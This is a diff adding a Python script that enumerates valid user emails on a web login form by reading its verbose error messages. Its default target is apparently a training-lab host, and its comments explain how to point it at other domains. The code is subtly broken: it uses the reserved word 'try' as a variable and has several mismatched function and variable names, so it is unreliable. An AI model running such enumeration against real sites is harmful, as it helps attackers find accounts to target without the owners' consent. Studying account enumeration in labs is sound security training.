@@ -1,0 +1,57 @@
+import requests
+import sys
+
+def check_email(email):
+    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
+    headers = {
+        'Host': 'domain.dom', # Change to domain you are testing #
+        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0', # You can change if you want #
+        'Accept': 'application/json, text/javascript, */*; q=0.01', # This might need to be changed based on how the form is submitted # 
+        'Accept-Language': 'en-US,en;q=0.5', # This is a preference #
+        'Accept-Encoding': 'gzip, deflate', # Probably can leave #
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', # Again, based on login form #
+        'X-Requested-With': 'XMLHttpRequest', # Also based on format of submission #
+        'Origin': 'http://domain.dom', # should probably just change this to be a variable set when running the script versus having to modify the script each use... # 
+        'Connection': 'close',
+        'Referer': 'http://domain.dom/login/url', # Could also add this as a variable #
+    }
+    data = {
+        'username': try,
+        'password': 'youCanLeave2',  # Using pw since this is for trying emails/usernames
+        'function': 'login'
+    }
+
+    response = requests.post(url, headers=headers, data=data)
+    return response.json()
+
+def enumerate_accounts(acount_file):
+    valid_accounts = []
+    invalid_error = "Email does not exist"  # Change to the error message for invalid emails/username you are expecting (also could probably be a variable #
+
+    with open(account_file, 'r') as file:
+        accounts = file.readlines()
+
+    for tries in trying:
+        try = tries.strip()  # Remove any leading/trailing whitespace #
+        if try:
+            response_json = check_account(account)
+            if response_json['status'] == 'error' and invalid_error in response_json['message']:
+                print(f"[INVALID] {try}")
+            else:
+                print(f"[VALID] {try}")
+                valid_accounts.append(try)
+
+    return valid_accounts
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python3 script.py <account_list_file>")
+        sys.exit(1)
+
+    email_file = sys.argv[1]
+
+    valid_accounts = enumerate_accounts(account_file)
+
+    print("\nValid emails found:")
+    for valid_account in valid_accounts:
+        print(valid_account)
